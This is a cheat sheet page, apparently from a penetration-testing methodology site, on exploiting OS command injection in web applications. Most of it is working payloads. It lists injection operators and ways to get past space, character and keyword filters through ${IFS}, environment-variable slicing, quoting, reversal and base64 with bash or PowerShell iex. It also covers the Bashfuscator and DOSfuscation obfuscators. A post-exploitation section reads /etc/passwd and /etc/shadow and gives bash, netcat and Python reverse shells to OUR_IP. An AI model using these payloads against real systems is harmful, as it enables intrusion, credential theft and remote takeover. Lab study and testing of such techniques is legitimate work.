---
title: "Command Injections"
description: "Operators, filter bypasses, blind injection, and evasion techniques."
sidebar:
  order: 6
  label: "Command Injections"
---
> OS command injection when user input is passed unsanitized to system execution functions. Bypassing character, space, and command filters using obfuscation.

---


## Injection Operators

| Operator | Character | URL-encoded | Executes |
|----------|----------|-------------|---------|
| Semicolon | `;` | `%3b` | Both |
| Newline | `\n` | `%0a` | Both — **frequently unfiltered** |
| Background | `&` | `%26` | Both (2nd first) |
| Pipe | `\|` | `%7c` | 2nd only |
| AND | `&&` | `%26%26` | Both (if 1st succeeds) |
| OR | `\|\|` | `%7c%7c` | 2nd only (if 1st fails) |
| Sub-shell | ` `` ` | `%60%60` | Both (Linux) |
| Sub-shell | `$()` | `%24%28%29` | Both (Linux) |

```bash
# Payloads básicos de prueba
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
|| whoami          # cuando el primer comando falla
127.0.0.1%0awhoami # newline como separador (más difícil de filtrar)
```

---

## Bypass — Frontend (JS Validation)

```bash
# Interceptar con Burp → modificar el campo directamente en la request
# 1. Subir request normal (IP válida)
# 2. CTRL+R → Repeater
# 3. Cambiar ip=127.0.0.1 → ip=127.0.0.1; whoami
# 4. CTRL+U → URL encode el payload
# 5. Send

# Alternativa: DevTools → borrar validación JS
# CTRL+SHIFT+C → seleccionar input → borrar onchange="validate(this)"
```

---

## Bypass — Filtered Spaces

```bash
# Técnica 1: Tab (%09) — funciona en Linux y Windows
127.0.0.1%0a%09whoami

# Técnica 2: ${IFS} — IFS es espacio+tab en bash
127.0.0.1%0a${IFS}whoami
cat${IFS}/etc/passwd

# Técnica 3: Brace expansion — sin espacios
{ls,-la}
{cat,/etc/passwd}
127.0.0.1%0a{whoami}

# Combinación con newline + IFS:
127.0.0.1%0a${IFS}cat${IFS}/etc/passwd
```

---

## Bypass — Filtered Characters (/ ; . etc.)

### Linux — Environment Variables

```bash
# Obtener / desde $PATH
echo ${PATH:0:1}          # → /
${PATH:0:1}etc${PATH:0:1}passwd  # → /etc/passwd en el payload

# Obtener ; desde $LS_COLORS
echo ${LS_COLORS:10:1}    # → ;

# Construcción de rutas sin /
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd

# Verificar variables disponibles
printenv    # listar todas las variables de entorno
```

### Linux — Character Shifting (Any Character)

```bash
# man ascii → ver tabla ASCII → char anterior al que buscamos
# \ = ASCII 92, antes está [ = ASCII 91
echo $(tr '!-}' '"-~'<<<[)   # → \

# ; = ASCII 59, antes está : = ASCII 58
echo $(tr '!-}' '"-~'<<<:)   # → ;
```

### Windows CMD

```cmd
# Obtener \ desde %HOMEPATH%
echo %HOMEPATH:~6,-11%        # → \

# Con PowerShell
$env:HOMEPATH[0]              # → \
$env:PROGRAMFILES[10]         # → \
```

---

## Bypass — Filtered Commands

### Quotes (Linux + Windows)

```bash
# Insertar comillas simples o dobles entre caracteres del comando
w'h'o'am'i      # → whoami (funciona en bash y PowerShell)
w"h"o"am"i      # → whoami
c'a't /etc/passwd

# Regla: no mezclar tipos; número de comillas debe ser par
```

### Backslash and $@ (Linux Only)

```bash
w\ho\am\i       # backslash ignorado por bash
who$@ami        # $@ ignorado por bash (argumento especial vacío)
```

### Caret ^ (Windows CMD Only)

```cmd
who^ami         # → whoami
```

---

## Advanced Bypass — Command Obfuscation

### Case Manipulation

```bash
# Windows — CMD/PowerShell case-insensitive
WhOaMi
WHOAMI

# Linux — convertir a minúsculas dinámicamente
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

# Sin espacios (combinar con IFS):
$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
```

### Reversed Commands (Linux)

```bash
# Obtener comando invertido
echo 'whoami' | rev      # → imaohw
echo 'cat /etc/passwd' | rev  # → dwssap/cte/ tac

# Ejecutar el reverso en payload
$(rev<<<'imaohw')
$(rev<<<'dwssap/cte/ tac')

# Windows PowerShell
"whoami"[-1..-20] -join ''       # → imaohw
iex "$('imaohw'[-1..-20] -join '')"
```

### Base64 Encoded (Linux)

```bash
# Codificar comando completo (evita caracteres filtrados)
echo -n 'cat /etc/passwd | grep 33' | base64
# Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

# Ejecutar decoded en bash (usa <<< para evitar pipe |)
bash<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

# Si "bash" está filtrado: usar sh
sh<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dk)

# Si "base64" está filtrado: openssl
openssl enc -d -base64<<<Y2F0IC9ldGMvcGFzc3dk | sh
```

### Base64 Encoded (Windows PowerShell)

```powershell
# Convertir comando a base64 UTF-16 (requisito de PowerShell)
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
# → dwBoAG8AYQBtAGkA

# En Linux para generar el payload Windows:
echo -n whoami | iconv -f utf-8 -t utf-16le | base64   # → dwBoAG8AYQBtAGkA

# Ejecutar en PowerShell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

---

## Automated Obfuscation Tools

### Bashfuscator (Linux)

```bash
# Instalar
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user

# Usar (payload corto y simple)
cd ./bashfuscator/bin/
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

# Verificar que funciona
bash -c '<payload_generado>'
```

### DOSfuscation (Windows)

```powershell
# Instalar
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation

# Uso interactivo
SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
encoding
1    # → genera payload ofuscado

# También disponible en Pwnbox (pwsh)
```

---

## Detection — Identifying What Is Filtered

```bash
# Probar operadores uno a uno hasta encontrar el que pasa:
127.0.0.1;           # → bloqueado?
127.0.0.1&           # → bloqueado?
127.0.0.1|           # → bloqueado?
127.0.0.1%0a         # newline → ¿pasa?

# Si el operador pasa, añadir espacio:
127.0.0.1%0a whoami  # ¿bloqueado por espacio?

# Si el espacio está filtrado, añadir comando:
127.0.0.1%0a%09whoami  # ¿bloqueado por "whoami"?

# Si el comando está filtrado:
127.0.0.1%0a%09w'h'o'am'i  # comillas → ¿bypasea?
```

---

## Useful Post-Exploitation Commands

```bash
# Identificación
whoami; id; hostname; uname -a

# Red
ip a; ifconfig; netstat -antp; cat /etc/hosts

# Archivos sensibles
cat /etc/passwd
cat /etc/shadow       # si tenemos permisos
find / -name "*.conf" 2>/dev/null
find / -name "config.php" 2>/dev/null

# Shell reversa desde webshell (si hay conexión saliente)
bash -i >& /dev/tcp/OUR_IP/4444 0>&1
nc -e /bin/bash OUR_IP 4444
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("OUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## Pitfalls / Gotchas

- **Semicolon in Windows CMD:** `;` does not work as an operator in CMD. Use `&` or `&&`. It does work in PowerShell.
- **Newline `%0a` is the most reliable:** it is rarely blacklisted because it is part of HTTP semantics. Always try it first.
- **`||` requires the 1st to fail:** if the first command succeeds, the second does not execute. Use `|| cmd` without an IP to guarantee ping failure.
- **`${IFS}` only in Linux bash:** it does not work in sh or zsh in the same way. Verify the server's shell.
- **Obfuscation + space filters:** when using advanced techniques like `tr` or `base64`, ensure there are no spaces in the payload. Use `%09` or `${IFS}`.
- **Mixing quotes:** do not mix `'` and `"` in the same word. Quotes must be paired.
- **Backslash `\` in blacklist:** if `\` is also filtered, use the quotes method instead.
- **Base64 with `|`:** if the pipe `|` is filtered, use `<<<` (herestring) to pass data. `bash<<<$(base64 -d<<<...)` avoids the pipe.
- **Bashfuscator long payload:** without `-s 1 -t 1`, it generates payloads of thousands of characters. Always use flags to limit the size.
- **WAF vs app filter:** if the error says "invalid input" within the form → PHP app filter. If it responds with a different page (403, etc.) → WAF. Bypass techniques differ.

---

## Related Cheatsheets

- [Using Web Proxies](/en/metodologias/web/using-web-proxies/) — intercepting and modifying requests to bypass frontend validation
- [File Inclusion](/en/metodologias/web/file-inclusion/) — LFI sometimes turns command injection into RFI
- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — reverse shells to scale from command injection
- [File Upload Attacks](/en/metodologias/web/file-upload-attacks/) — command injection in the uploaded filename
- [Web Attacks](/en/metodologias/web/web-attacks/) — SSRF and XXE can also lead to indirect command injection
